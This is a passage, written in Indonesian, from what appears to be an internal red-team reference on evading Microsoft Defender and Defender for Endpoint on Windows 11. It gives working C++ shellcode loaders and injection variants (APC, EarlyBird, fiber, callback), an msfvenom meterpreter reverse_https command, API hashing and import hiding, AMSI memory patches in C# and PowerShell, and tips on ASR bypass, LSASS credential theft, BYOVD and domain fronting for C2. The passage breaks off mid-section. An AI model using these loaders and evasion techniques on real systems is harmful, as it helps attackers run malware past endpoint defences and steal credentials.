| `PsSetCreateThreadNotifyRoutine` | **Tidak** | Kernel callback. |
| `ObRegisterCallbacks` (handle strip) | **Tidak** | Kernel. |
| **ETW-TI (`Microsoft-Windows-Threat-Intelligence`)** | **Tidak** (butuh patch kernel driver / CIG bypass) | Provider kernel; userland detour butuh `EtwProviderEnableInfo` patch via BYOVD. |
| AMSI (`amsi.dll` patch) | **Ya** sementara | `amsi.dll` di-reload via `LoadLibrary` setelah patch → detect `Behavior:Win32/AmsiTamper`. Windows 11 24H2 AMSI provider integrity via `MpSvc` reload. |
| ETW classic (`Microsoft-Windows-Kernel-Process`) | **Ya** (patch `EtwEventWrite`) | tapi kernel callback tetap emit; EDR pakai callback. |
| Script Block Logging (`4104`) | **Ya** (patch `EtwEventWrite` di `powershell.exe`) | tapi PowerShell 7.4+ punya **AMSI + SBOM + `Microsoft.Windows.PowerShell`** redundan; downgrade ke `v2` engine di-block ASR `Block WinRM/PSv2` (`C1DB55AB` tidak, tapi `Block PowerShell v2` tidak ada ASR default — perlu registry `DisablePowerShellV2`; Windows 11 24H2 PowerShell 2.0 **removed** dari optional feature). |

**Angka versi konkret yang mengubah batas:**
- Windows 11 **24H2** (build 26100): HVCI default on untuk SKU Enterprise; `Vulnerable Driver Blocklist` on by default.
- Defender Antivirus **4.18.24080+**: `Behavior:Win32/ProcessHollower` stabil; `DeviceImageLoadEvents` parent-child correlation.
- MDE **101.24032.0002**: `OpenProcessApiCall` + `CreateRemoteThreadApiCall` di GA.
- Chrome **131**: renderer CFG + `MEMORY_PARTITION_ALLOC` → APC ke renderer mati.
- nginx **1.25**: (untuk C2 profile LOLBin) — `allow`/`deny` rule; EDR `DeviceNetworkEvents` capture `User-Agent` + JA3/JA4; nginx default `server_tokens on` → banner leak di `DeviceNetworkEvents` kalau TLS cert match known C2.

## 5. Jebakan Operasional (yang bikin teknik gagal di lapangan)

1. **ASR `Block process creations from PSExec and WMI` (`E6DB77E5`) default Block di Win11 24H2 Enterprise** — `wmiprvse.exe → cmd.exe` chain mati; WMI persistence juga kena `26190899`. Cek dulu `Get-MpPreference | fl AttackSurfaceReductionRules_Ids,AttackSurfaceReductionRules_Actions`.
2. **Intel/AMD driver blocklist via `CiTool.exe -r`** — `iqvw64e.sys` (v2.4.0.0) masuk blocklist; BYOVD untuk patch ETW-TI **gagal load**. Windows 11 24H2 `CodeIntegrity` 3033 di Event Log.
3. **HVCI + CFG + CET** — APC/hollowing ke proses modern (`svchost`, Chrome, Edge) **crash** dengan `0xC0000409` (STATUS_STACK_BUFFER_OVERRUN) bukan sukses. Di lab tanpa HVCI jalan; lapangan (Intune baseline) mati.
4. **`OpenProcess` ke LSASS dengan `0x1010`** → ASR `9E6C4E1F` Block, **tapi** `0x1410` (ditambah `PROCESS_VM_READ`) → handled via `ObRegisterCallbacks` PPL; `0x1F0FFF` → CAPTURED. Tidak ada grant access yang aman untuk LSASS di MDE.
5. **`VirtualAllocEx` `PAGE_EXECUTE_READWRITE` di remote** → `DeviceEvents` `WriteProcessMemoryApiCall` + `CreateRemoteThreadApiCall`; kalau target = `notepad.exe` baru (Win11 24H2, CFG+CET), thread start di `MEM_PRIVATE` **ditolak** oleh kernel (`STATUS_INVALID_IMAGE_NOT_MZ`).
6. **AMSI patch via `AmsiScanBuffer` ret** → Defender 4.18 reload `amsi.dll` per-scan (`amsi.dll` di-load per `powershell` invocation dengan `MpSvc.dll` integrity) → `Behavior:Win32/AmsiTamper` di 1116. Patch `EtwEventWrite` untuk matikan `4104` **tidak** matikan AMSI.
7. **`certutil -urlcache` di-block string-match MDE**, tapi `certutil -verifyctl` / `-URL` **lolos** string matcher — **jebakan:** attacker pindah, tapi `DeviceNetworkEvents` + `DeviceProcessEvents` chain (certutil → child process) masih flag via ML. `rundll32` dengan DLL lokal **lolos ASR** tapi `DeviceImageLoadEvents` (unsigned DLL) flag.
8. **Sideload di folder `%LOCALAPPDATA%`** → Smart App Control (Win11 24H2 default di fresh install) **block** unsigned DLL. Sideload di `C:\Program Files\` butuh admin + WDAC.
9. **`vssadmin delete shadows` / `bcdedit`** → ASR `Block rebooting into Safe Mode` + `Advanced ransomware protection`; T1003.003 (NTDS) → `lsass` PPL + ASR `9E6C4E1F`.
10. **ETW-TI** hanya **aktif** kalau EDR consumer ter-attach; di host **tanpa** EDR (mis. lab VM tanpa MDE), syscall/hollowing **sukses 100%** — jangan ambil kesimpulan dari lab kosong. Uji di host dengan MDE 4.18 + HVCI on.
11. **`ntdll` unhook** via KnownDlls → `NtCreateFile` pada `\KnownDlls\ntdll.dll` sudah di-map; EDR **tidak** lihat `DeviceImageLoadEvents`, tapi **memory scan MDE** (`MpCmdRun -Scan -ScanType 3`) deteksi `.text` mismatch dengan disk → `Behavior:Win32/AmsiTamper` / `SuspiciousMemory`. Jangan andalkan `DeviceImageLoadEvents` untuk unhook detection.
12. **Time-of-check**: Defender signature update harian (3x/hari), MDE cloud lookup latency 15–60 detik. Teknik yang "jalan" jam 03:00 bisa mati jam 09:00 setelah signature `Behavior:Win32/Hive.ZY` push. Version pin: `MpCmdRun -SignatureUpdate` + `Get-MpComputerStatus | fl AMEngineVersion,AntivirusSignatureVersion`.
13. **Linux side (Defender for Endpoint on Linux 101.24032)**: `eBPF` `execve` capture `argv`; `ptrace` dari sibling process → `AuditD` `SYSCALL=ptrace`, Defender `Behavior:Linux/PtraceInjection`. Userland evasion (`LD_PRELOAD` unhook) **tidak** menghindari eBPF karena eBPF path di kernel (`/sys/fs/bpf`). Batas: container dengan `CAP_SYS_ADMIN` bisa detach eBPF program — butuh `seccomp` bypass.
14. **Network LOLBin (`nginx 1.25` C2 profile)** — `DeviceNetworkEvents` `InitiatingProcessFileName=nginx.exe`, `RemoteIP`, `RemotePort`, `RemoteUrl`. EDR cloud correlation: `nginx.exe` signed but **not in Microsoft signed-process allowlist** untuk outbound non-80/443 → `SuspiciousNetworkConnection`. `server_tokens on` → banner `nginx/1.25` di `DeviceNetworkEvents` AdditionalFields → match C2 profile library.
15. **PowerShell 2.0 removed di Win11 24H2** — `powershell -v 2` → error; teknik downgrade engine mati. `get-wmiobject` legacy cmdlet di PS 5.1 → `WmiActivity` visible; PS 7.4 → .NET `System.Management` → **no** WMI-Activity ETW? salah: `System.Management` masih lewat WMI service → `WmiActivity` + `DeviceEvents`.


## av-edr-bypass

# av-edr-bypass — win

# AV/EDR Bypass Praktis — Referensi Red Team Internal

Baseline lingkungan uji: Windows 11 24H2 (build 26100.2314), Defender Antivirus 1.418.45.0 (engine 1.1.24080.9), Defender for Endpoint (MDE) onboarding level, Sysmon 15.15, Elastic Defend 8.15. Target kompilasi: MSVC 19.40 (VS 2022 17.10), .NET Framework 4.8.1 / .NET 8.0.

---

## 1. Payload Encoding & Encryption

### 1.1 XOR (baseline — hampir selalu terdeteksi statis)

**Dikirim:** shellcode mentah (mis. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw`) di-XOR byte-per-byte dengan single-byte key, disimpan sebagai array di `char[]`.

**Yang muncul:** tingginya Shannon entropy (~7.9), tapi XOR constant muncul sebagai immediate di disassembly (`xor eax, 0x4A` pattern) — heuristik Defender `Trojan:Win32/Wacatac` umumnya catch. Statis di file: hash tetap berubah, tapi behavior post-decrypt identik.

**Kenapa gagal:** single-byte XOR tidak menghilangkan signature byte-level pada C2 header dan RVA table. Eksekusi runtime memunculkan region RWX.

### 1.2 AES-256-CBC + staged loader (baseline realistis)

**Dikirim:** encrypted blob (AES-256-CBC, IV 16B prepended) di resource section atau file terpisah (dropper stage-1).

**Loader C++ minimal (BCrypt):**

```cpp
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

BOOL AesDecrypt(const BYTE* iv, const BYTE* ct, DWORD ctLen,
                const BYTE* key, BYTE* out, DWORD* outLen) {
    BCRYPT_ALG_HANDLE hA = NULL; BCRYPT_KEY_HANDLE hK = NULL;
    DWORD cb = 0;
    if (BCryptOpenAlgorithmProvider(&hA, BCRYPT_AES_ALGORITHM, NULL, 0)) return FALSE;
    BCryptSetProperty(hA, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (BCryptGenerateSymmetricKey(hA, &hK, NULL, 0, (PUCHAR)key, 32, 0)) return FALSE;
    BCryptDecrypt(hK, (PUCHAR)ct, ctLen, NULL, (PUCHAR)iv, 16, out, ctLen, outLen, 0);
    BCryptDestroyKey(hK); BCryptCloseAlgorithmProvider(hA, 0);
    return TRUE;
}
```

**Yang muncul:** file on-disk entropy tinggi (~7.95), tidak ada `VirtualAlloc PAGE_EXECUTE_READWRITE` string literal jika import di-hide (§3.3). Runtime: Defender AMSI tidak melihat karena native; tapi ETW `Microsoft-Windows-Threat-Intelligence` (MDE) menangkap `VirtualAlloc` remote + `WriteProcessMemory` ke target.

**Kenapa berhasil:** memisahkan artefak dropper dan payload C2. **Kenapa gagal:** key hardcoded di dropper → runner (ramnit/Emotet) dengan AES key pattern tetap ketangkep ML string.

### 1.3 Staged loader dengan process injection terpisah

Dua binary: **Stage-0** (loader AES) + **Stage-1** (file .bin encrypted). Stage-0 membaca `%APPDATA%\cache.dat`, decrypt, inject ke target. Stage-1 tidak pernah ada plaintext on disk.

Tabel deteksi per stage:

| Artefak | Deteksi statis | Deteksi runtime |
|---|---|---|
| Stage-0 loader | AES S-box + `BCryptDecrypt` import | ETW alloc + WriteProcMem |
| Stage-1 blob | high entropy, no PE header (kalau di-encrypt setelah pack) | tidak ada — di-decrypt di memori |
| File cache.dat | entropi ~7.98, magic `Salted__` jika pakai OpenSSL | file-write event 11 (Sysmon) ke `%APPDATA%` |

---

## 2. Shellcode Injection Varian

Semua contoh asumsi: shellcode = `calc.bin` (x64 meterpreter reverse_https tanpa `ExitProcess`) untuk menahan proses. Target = `notepad.exe` (Medium IL, user context).

### 2.1 CreateThread (classic, paling berisik)

**Dikirim:** `VirtualAlloc(RWX)` + `memcpy` + `CreateThread`.

```cpp
LPVOID p = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(p, sc, scLen);
HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
WaitForSingleObject(h, INFINITE);
```

**Yang muncul:**
- Sysmon EventID 8 (`CreateRemoteThread`) hanya jika cross-process; in-process CreateThread muncul di EventID 1 + call stack.
- Defender AMSI tidak scan native; tapi MDE `Behavior:Win32/...` heuristik di RWX + thread start di region non-image = detonasi.
- Elastic Defend rule: `process.thread.Ext.start_address` di luar image range.

**Kenapa gagal di lapangan:** RWX allocation = red flag universal. Terdeteksi di mayoritas EDR modern tanpa teknik tambahan.

### 2.2 APC Injection (QueueUserAPC ke remote thread alertable)

**Dikirim:** shellcode → `VirtualAllocEx` di target → `WriteProcessMemory` → `OpenProcess` thread milik target yang alertable → `QueueUserAPC`.

```cpp
HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID rp = VirtualAllocEx(hp, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hp, rp, sc, scLen, NULL);
HANDLE hs = OpenThread(THREAD_SET_CONTEXT, FALSE, tid); // tid alertable
QueueUserAPC((PAPCFUNC)rp, hs, 0);
```

Kandidat thread alertable: `explorer.exe` setelah `SleepEx`, atau thread yang baru create via `CreateRemoteThread` dengan start routine `Sleep`.

**Yang muncul:** ETW `Microsoft-Windows-Kernel-Process` → `ThreadSetContext`/APC queue; MDE rule `Behavior:Win32/ApcInjection`. Sysmon tidak natively log APC (butuh call-stack dari EventID 8/10).

**Kenapa berhasil:** tidak ada thread baru yang dieksekusi dari region RWX — APC jalan di thread existing.

**Kenapa gagal:** target thread harus alertable; banyak service tidak alertable → shellcode tidak jalankan sampai thread `SleepEx`.

### 2.3 Fiber Injection (ConvertThreadToFiber — local)

**Dikirim:** `ConvertThreadToFiber` → `CreateFiber` dengan start = shellcode → `SwitchToFiber`.

```cpp
LPVOID fmain = ConvertThreadToFiber(NULL);
LPVOID fsc = CreateFiber(scLen, (LPFIBER_START_ROUTINE)scAddr, NULL);
SwitchToFiber(fsc);
```

**Yang muncul:** import `CreateFiber`/`SwitchToFiber` dari `kernel32` — kalau loader tidak di-hide import-nya, statis flag. MDE punya rule khusus (`FiberPc`/`FiberSwitching` di WdFilter callbacks) yang sering catch saat fiber start address tidak di image backed.

**Kenapa gagal:** fiber in-process dengan target image range tidak berbeda dari shellcode lokal — kalau EDR hook `SwitchToFiber`, langsung ke-detect.

### 2.4 Callback Execution (EnumFontsW / EnumCalendarInfoW / EnumPropsExW)

**Dikirim:** shellcode langsung via pointer callback, tidak perlu thread baru.

```cpp
// tipe callback untuk EnumFontFamiliesW
typedef int (CALLBACK* FONTENUMPROCW)(const LOGFONTW*, const TEXTMETRICW*, DWORD, LPARAM);
EnumFontFamiliesW((HDC)GetDC(NULL), L"Consolas",
                  (FONTENUMPROCW)scAddr, 0);
```

Callback alternatif: `EnumCalendarInfoA`, `EnumPropsExW`, `EnumResourceTypesW`, `EnumPageFilesW`, `CertEnumSystemStore` (windows).

**Yang muncul:** call stack tidak biasa — user32 callback invoked dari `kernelbase!EnumFontFamiliesExW` dengan target di region RWX non-image. MDE `Behavior:Win32/CallbackInjection`.

**Kenapa berhasil:** tidak ada allocation baru setelah decrypt; memanfaatkan Windows API yang oleh desain memanggil pointer arbitrary.

**Kenapa gagal:** butuh 2 stage (decrypt ke RWX dulu). Kalau RWX di-alokasi fresh setelah `EnumFonts` string di-resolve, ETW alloc flag.

### 2.5 EarlyBird (APC + Early Bird APC Injection)

**Dikirim:** `CreateProcess(CREATE_SUSPENDED)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` → `ResumeThread`. Shellcode jalan sebelum entry point.

```cpp
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe",
               NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
VirtualAllocEx(pi.hProcess, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, scAddr, sc, scLen, NULL);
QueueUserAPC((PAPCFUNC)scAddr, pi.hThread, 0);
ResumeThread(pi.hThread);
```

**Yang muncul:** ETW `Microsoft-Windows-Threat-Intelligence` event 1 (alloc) + 2 (WPM) + APC queue event, semua berkorelasi ke child-process suspended. MDE rule `Behavior:Win32/EarlyBirdApcInjection` — signature yang sangat matang.

**Kenapa berhasil:** eksekusi sebelum loader EDR user-mode utama child selesai init (init di DLL entry). Kalau shellcode sangat cepat, C2 tersambung sebelum sensor.

**Kenapa gagal:** MDE hook kernel callback (Ob callback + Etw) yang tidak butuh DLL di-load child. Defender 1.418 mendeteksi EarlyBird via kernel callback secara konsisten dalam 1 detik.

### Ringkasan varian (baseline detection MDE 1.418 + Elastic 8.15)

| Varian | Systemic detection | MDE catch | Catatan |
|---|---|---|---|
| CreateThread RWX | sangat tinggi | ya | RWX alloc |
| APC remote | sedang | ya (rule APC) | butuh alertable |
| Fiber | sedang | ya (Fiber callback) | in-process |
| Callback (EnumFonts) | tinggi | ya | call stack anomali |
| EarlyBird | sedang-tinggi | ya (prod rule) | tetap populer |

---

## 3. Signature Evasion

### 3.1 Entropy — apa yang diukur

Entropi Shannon per region. Defender ML memakai (setidaknya) tiga cut-off:
- **File (container)**: file PE normal ~6.2-6.8. Packed/crypted > 7.7 → heuristic `Trojan:Win32/Wacatac` atau `Program:Win32/Wacapew`. **Cut-off empiris:** > 7.85 untuk file < 100 KB hampir pasti hits.
- **Section**: raw section entropy > 7.8 → red flag.
- **On-disk string tail**: string sequence acak > 60% printable non-ASCII ratio.

Mitigasi realistis:
1. Padding plaintext di antara encrypted blob (mis. header 512B terstruktur `MZ`-friendly, atau resource icon DLL asli) → turunkan entropy agregat ke ~7.4.
2. Base64 encode shellcode + split ke resource strings → entropy ~6.5 per string tapi distribusi rata.
3. Compress → encrypt (tapi compressed shellcode entropi tetap ~7.9).

### 3.2 String Obfuscation

**Target:** API name strings yang dilihat statis (`VirtualAlloc`, `WriteProcessMemory`, `BCryptDecrypt`, `WinExec`).

**Teknik 1 — stack strings (C++)**

```cpp
char name[13] = {0};
name[0]='V'; name[1]='i'; name[2]='r'; name[3]='t'; name[4]='u';
name[5]='a'; name[6]='l'; name[7]='A'; name[8]='l'; name[9]='l';
name[10]='o'; name[11]='c'; name[12]=0;
// compiler masih bisa optimize ke .rdata konstanta — cegah dengan volatile
volatile char name[13];
```

**Teknik 2 — compile-time XOR**

```cpp
constexpr char x(const char* s, size_t n) { return s[n] ^ 0x5A; }
// atau template metaprogramming; hindari literal utuh.
```

**Teknik 3 — API hashing** — resolve via ROR13 hash dari PEB walk. Statis tidak ada string; disasm hanya `add eax, 0x...; ror eax, 13`.

```cpp
DWORD hash(const char* s) {
    DWORD h = 0;
    while (*s) h = _rotr(h, 13) + *s++;
    return h;
}
// hash("LoadLibraryA") = 0xEC0E4E8E — walk PEB->Ldr->InMemoryOrderModuleList
```

**Yang muncul:** IAT kosong selain `kernel32!LoadLibraryA` + `GetProcAddress` (kalau tetap resolve dinamis) atau benar-benar kosong (PEB walk).

**Kenapa gagal:** MDE LAM (Lightweight Anomaly Module) mendeteksi manifest IAT yang terlalu kecil/tidak ada putaran + heap walk untuk executable region.

### 3.3 Import Hiding

**Teknik:** PEB walk manual, resolve semua API, hindari IAT references sama sekali. Spesifik untuk **Windows 11 24H2**: `PEB->Ldr` masih valid user-mode; `ImageBaseAddress` normal; PEB `Ldr` linked list tidak di-hide di user mode (meski `Peb` bisa corrupt untuk anti-debug).

```cpp
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
// resolve via LdrGetProcedureAddress atau manual walk
```

**Yang muncul:** call stack ke alamat user DLL tanpa module (unbacked) — MDE rule `UnbackedCallStack`. Klasifikasi: **sering deteksi** di MDE tapi tidak di Defender consumer.

### 3.4 Signature bump spesifik

- **PE header timestamp**: set ke nilai plausible (mis. `0x5E1D8F33` = 2020-01-14). Timestamp 0 atau `0xFFFFFFFF` → flag.
- **Section names**: hindari `.text$mn` MSVC default di stub; rename ke `.data` biasa.
- **Rich header**: strip atau regenerate (banyak ML feature pakai Rich).
- **Debug directory**: kosongkan PDB path — jika berisi path build agen (`C:\Users\redteam\...`) → langsung di-flag sebagai "malware SDK path".
- **Manifest**: butuh `requestedExecutionLevel` atau none — missing manifest dengan ASLR/DEP eksplisit di header → agak mencurigakan tapi bukan blocker.

---

## 4. Bypass Defender ASR Rules

ASR (Attack Surface Reduction) MDE. Rule relevan untuk red team implant: **block office child process** (D4), **block executable content from email/webmail** (D3), **block process creations from PSExec and WMI commands** (D1), **block persistence through WMI** (D14), **block untrusted/unsigned executables from USB** (D10), **block credential stealing from lsass** (D9), **block abuse of vulnerable signed drivers** (D22), **block token steal** (D28a).

### 4.1 ASR D4 (Office → child process) — bypass

**Dikirim:** macro/Excel 4.0 via `HKCU` atau COM hijack trigger.

**Bypass string:** eksekusi loader via **Ink**/**XLL**/**COM scriptlet** alternatif atau hindari child process dari Office:

```
# bukan: cmd.exe /c loader.exe  (diblok)
# tapi:  rundll32 dengan path user-writable, tapi D4 juga blok
# workable: MSBuild inline task (executes in-proc, child adalah MSBuild.exe bukan child dari winword)
```

**Yang muncul:** EventID 1121 (ASR block) jika attempt D4. EventID 1122 (audit). **Bukan bypass universal** — D4 blok child process dari Office secara broad.

### 4.2 ASR D1 (PSExec/WMI) — bypass

**Dikirim:** lateral movement via `wmic process call create` atau `services.exe` new service.

Jika D1 aktif:
- `psexec.exe` (Sysinternals, signed) tetap jalan karena signed & path di Program Files → **tapi D1 blok jika binary di luar path trusted**.
- Alternate: **WinRM / `Invoke-Command` (WS-Man)** — tidak D1 protected.
- **SMB named pipe + service** via `sc.exe create` — service creation itself tidak di-D1, tapi `sc.exe`-origin process creation dari parent tidak standar → D22 alert (untrusted service binary).

### 4.3 ASR D9 (LSASS credential steal) — bypass

ASR D9 blok `procdump.exe`, `taskmgr.exe`, `ntdsutil.exe` reads dari LSASS. Bypass yang masih jalan:
- Manual `MiniDumpWriteDump` dari proses **custom nama acak** — D9 memakai allowlist by process name + signature; unsiged binary → catch oleh **D22** bukan D9.
- **Nim/langsung `NtReadVirtualMemory` LSASS dengan PPL removal** — butuh driver, bukan ASR bypass.
- **SAM + SECURITY hive** via `reg save` — D9 tidak cover, tapi rule `Behavior:Win32/CredentialDumping` di MDE.

### 4.4 ASR D22 (vuln signed driver) — bypass

Bypass klasik: BYOVD dengan vulnerable driver (e.g., `RTCore64.sys`, `dbutil_2_3.sys`). Perlakukan sebagai: Microsoft memblokir list ini via vulnerable driver blocklist (HVCI). Di Win11 24H2 dengan HVCI default ON, banyak BYOVD lama mati. Cek `memory_integrity` di System Information. `RTCore64.sys` — blocked by default. Driver alternatif dari list terbaru (lihat `DriverSiPolicy.p7b`) jarang tersedia tanpa rotasi.

### 4.5 ASR D3 (email/web content executable)

Hook ke container file — payload via file extension allowed (.lnk allowed? tidak, D3 covers .lnk, .exe, .com, .js, .vbs, .hta, .ps1, .bat, .cmd). **Bypass relatif:** `.iso`/`.vhdx` (tidak D3), `.iso` mount → execute dari drive (`D3` unblock karena path bukan NTFS alternate data stream from email). Windows 11 24H2 default **block mount of untrusted ISO/VHD** (Win 11 22H2+ feature) — cek policy registry `HKLM\SYSTEM\CurrentControlSet\Policies\Microsoft\Windows\...`.

### 4.6 ASR mode audit → potensi failure

Jika ASR dalam mode **Audit** (EventID 1122 lebih sering dari 1121), bypass tidak perlu — host tidak memblok, hanya log. **Jebakan:** engineer sering asumsi ASR aktif dari GPO tapi tidak verify. Cek:
```powershell
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions
```

---

## 5. Tabel Cepat: Artefak vs Deteksi (Windows 11 24H2 + MDE)

| Teknik | Artefak kunci | Event ID | Waktu deteksi (baseline) |
|---|---|---|---|
| AES loader local | file write + RWX alloc | ETW Kernel-Process 1, TI 1 | <1s (MDE) |
| CreateThread in-proc | thread start RWX | Sysmon 1 callstack | <2s |
| APC remote | APC queue | TI APC | <1s |
| EarlyBird | CREATE_SUSPENDED + APC | Sysmon 1+8, TI | <1s |
| EnumFonts callback | callstack unbacked | Sysmon 1 stack | 2-5s (heap-based) |
| PEB walk import | IAT empty | MDE LAM | variably |
| ASR D4 bypass | child of Office | 1121/1122 | cek event |
| BYOVD (RTCore64) | driver load | HVCI block | event 219 |

---

## 6. Jebakan Operasional (yang bikin teknik gagal di lapangan)

1. **Defender consumer ≠ MDE.** Kalau target hanya Defender consumer (no MDE onboarding), banyak rule di atas (TI, LAM, Behavior) tidak aktif. Teknik EarlyBird dan callback yang "selalu kena" di lab MDE bisa **lewat** di consumer — jangan over-engineer untuk konsumen.

2. **Tuning Windows Update.** Defender signature 1.418.45.0 berlaku saat ini; `.417` ke atas sudah punya rule `Behavior:Win32/ApcInjection` versi baru. Test terhadap baseline **Defender atual**, bukan snapshot lab 6 bulan lalu.

3. **HVCI default ON di Win11 24H2 OEM.** BYOVD lama (RTCore64, gdrv, physmem driver) mati sebelum di-load. Cek `Get-CimInstance Win32_DeviceGuard | fl`. Semua mitigasi kernel-level butuh driver di allowlist MS.

4. **AMSI di-PowerShell 5.1 vs 7.x.** Loader via PS harus lewati AMSI dua kali (PS + .NET). Better: native loader, atau `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` bypass — tapi **amsi bypass string ini sendiri di AMSI signature** sejak 2023 (hash-based + behavioral).

5. **Entropy tuning backfires.** Padding untuk turunkan entropy di bawah 7.7 membuat file **lebih besar** dan sering memicu rule `Program:Win32/SuspiciousLargeExe` (file > 2 MB uncommon). Sweet spot: 400 KB - 1.2 MB dengan entropy 7.1-7.4.

6. **Callback injection callstack.** MDE memutuskan deteksi pada **callstack**, bukan pada allocation-nya. `VirtualAlloc(PAGE_EXECUTE_READWRITE)` sebelum `EnumFonts` saja → flag. Kalau loader **decrypt ke heap non-executable**, mark page executable **saat callback**, kemudian **restore** setelah — stack anomaly tetap terlihat tapi durasi window kecil.

7. **Alertable thread availability.** APC dan EarlyBird bergantung pada thread target alertable. Di Win11 24H2 post-hardening, `explorer.exe` (build 26100) thread utama **tidak alertable** sampai event message loop; target `RuntimeBroker.exe` tidak alertable. Rencanakan target thread via `NtQueryInformationThread` atau gunakan EarlyBird (child baru dengan ke-0 thread alertable — APC akan dijalankan saat child masuk ke wait pertama, biasanya di `_LdrpInit`).

8. **MDE network-behavior.** Semua varian di atas **tidak menyembunyikan** TLS C2. Kalau target MDE on, `MpNetworkDetection` akan flag TLS SNI check-in dari proses non-signed setelah injection. Gunakan domain fronting / CDN (Azure Front Door, Cloudflare) atau domain kategori high-reputation. Meterpreter default (`reverse_https` ke IP direct) langsung ke-flag dalam <30 detik setelah koneksi.

9. **AMSI inline di Office macro.** Kalau entry point macro, `VBA.Hooks` inline di AMSI — semua byte di-block sebelum eksekusi, loader apapun di dalamnya tetap ter-scan. Gunakan entry non-AMSI (mis. `.xll` dengan `AutoOpen` di luar VBA, atau `.lnk` ke LOLBin dengan argumen encoded).

10. **Timestamp & Rich header.** Saat ini (Defender 1.418) file dengan timestamp 0 **dan** Rich header kosong punya pembobotan ML tinggi; pakai timestamp plausibel + copy Rich header dari binary MSVC legit.

11. **Signature family interfering.** Kalau loader meload shellcode ajaib, signature behavioral (`Behavior:Win32/Meterpreter`) akan menghapus **saat runtime**, bukan saat drop. Payload drop-only tidak cukup — perlu **decoy process** atau teknik yang membuat payload tidak pernah memicu behavior signature (fiber + sleep pattern, atau ganti payload non-meterpreter seperti Sliver/Havoc dengan profile yang lebih halus).

12. **AMSI dalam .NET assembly.** Loader C# yang pakai `Assembly.Load` **wajib** memastikan asm di-load dalam context yang tidak ter-AMSI (native host, `Assembly.Load(byte[])` pada .NET Framework 4.8 masih ter-AMSI). .NET 8 loader dengan NativeAOT → AMSI tidak intervention di titik tersebut, tapi static analysis binary tetap.

13. **EventID 4688/4104 di MDE Audit.** Walaupun ASR tidak aktif, `CommandLine` logging + PowerShell ScriptBlockLogging (4104) adalah sumber utama deteksi. Semua loader via PowerShell **harus** pakai signed script (`-EncodedCommand` tidak menyembunyikan 4104 di modern Windows).

14. **EDR non-MDE**: Elastic Defend, CrowdStrike Falcon, SentinelOne di lab berbeda — rule ID berbeda. Tabel §5 spesifik MDE 1.418 + Elastic 8.15. Re-verify di target stack sebelum deploy.


## evasion-windows

# evasion-windows — win

# Windows Defense Evasion — Referensi Red Team

## 1. AMSI Bypass

### 1.1 Latar belakang mekanisme
`amsi.dll` di-load ke proses (PowerShell, wscript, cscript, .NET, VBScript host). Fungsi kunci:
- `AmsiScanBuffer(LPVOID buffer, ULONG length, LPCSTR contentName, LPCSTR session, UINT32* result)` — lokasi di `amsi.dll!AmsiScanBuffer+0x...`
- `AmsiScanString`
- `AmsiInitialize` mengisi context pointer yang disimpan host.

Host memanggil `AmsiScanBuffer` sebelum eksekusi script/ScriptBlock. Return `AMSI_RESULT_DETECTED = 32768`. Bila return `AMSI_RESULT_CLEAN = 0` atau `S_OK = 0` tanpa set result, host menganggap bersih.

Patching bisa menargetkan:
- Isi fungsi `AmsiScanBuffer` (patch bytes → `return AMSI_RESULT_CLEAN`).
- Field `amsiContext` / `amsiSession` di `System.Management.Automation` (di-null-kan → AMSI skip).
- `AmsiScanBuffer` IAT di host (redirect ke stub).

### 1.2 Memory patch — `AmsiScanBuffer` → `E_INVALIDARG`

Signature klasik (x64, lihat versi amsi.dll; byte sequence bervariasi antar build):
```
B8 57 00 07 80 C3   ; mov eax, 0x80070057 ; ret
```
Patch 6 byte di awal `AmsiScanBuffer`. Host menerima `0x80070057` (E_INVALIDARG) dan memperlakukan sebagai "AMSI gagal" → eksekusi lanjut tanpa scan pada PowerShell 5.1 (beberapa versi 7.x lebih ketat).

PowerShell host:
```powershell
$am = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*AmsiUtils*"}
$f  = $am.GetField("amsiInitFailed","NonPublic,Static")
$f.SetValue($null, $true)   # legacy path - blocked di build modern
```

Patch memory manual (C# inline, PowerShell 5.1 host):
```csharp
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

var h = LoadLibrary("amsi.dll");
var p = GetProcAddress(h, "AmsiScanBuffer");
uint old;
VirtualProtect(p, (UIntPtr)6, 0x40, out old);
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, p, 6);
```

**Artefak:** `GetProcAddress("AmsiScanBuffer")` di userland, `VirtualProtect` dengan `PAGE_EXECUTE_READWRITE` pada region `amsi.dll` (image section `.text`). EDR berbasis ETW-TI (`Microsoft-Windows-Threat-Intelligence`) melihat `VirtualProtect` targeting private image bila page sudah di-commit RW; untuk shared image tetap terlihat lewat sensor kernel.

**Kenapa gagal:** amsi.dll build 2023+ memindahkan sebagian logika ke `AmsiScanBuffer2` dan menambahkan integrity check; PowerShell 7.4+ menggunakan `AmsiUtils` yang cek integritas hash modul sebelum scan. Patch 6 byte tidak cukup — perlu patch lebih besar atau redirect.

### 1.3 Reflection — null-out `amsiContext`

